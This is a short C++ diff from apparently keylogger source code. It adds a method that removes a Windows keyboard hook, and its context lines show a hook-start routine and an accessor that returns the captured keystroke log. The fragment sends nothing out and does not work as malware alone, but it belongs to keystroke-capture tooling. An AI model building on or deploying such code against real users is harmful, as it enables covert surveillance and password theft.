@@ -82,6 +82,12 @@ void keyLogger::startHook()
 	GetMessageW_c(&msg, NULL, NULL, NULL);
 }
 
+void keyLogger::stopHook()
+{
+	if (keyHook != NULL)
+		UnhookWindowsHookEx(keyHook);
+}
+
 std::string keyLogger::getKeyLog()
 {
 	return keyLogger::keyLog;
